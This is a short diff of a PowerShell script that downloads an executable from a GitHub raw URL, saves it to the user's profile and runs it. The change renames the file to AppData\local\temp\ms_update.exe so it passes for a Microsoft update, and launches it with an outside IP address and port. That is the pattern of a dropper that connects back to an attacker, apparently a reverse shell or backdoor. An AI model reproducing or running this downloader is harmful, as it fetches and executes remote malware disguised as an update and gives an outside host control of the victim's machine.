@@ -1,5 +1,5 @@
 $dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/179_61_197_44_55639.exe"
-$dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "Music\temp.exe"
+$dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "Appdata\local\temp\ms_update.exe"
 Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
 cd $env:USERPROFILE
-.\Music\temp.exe
+.\Appdata\local\temp\ms_update.exe 149.50.218.26 55639
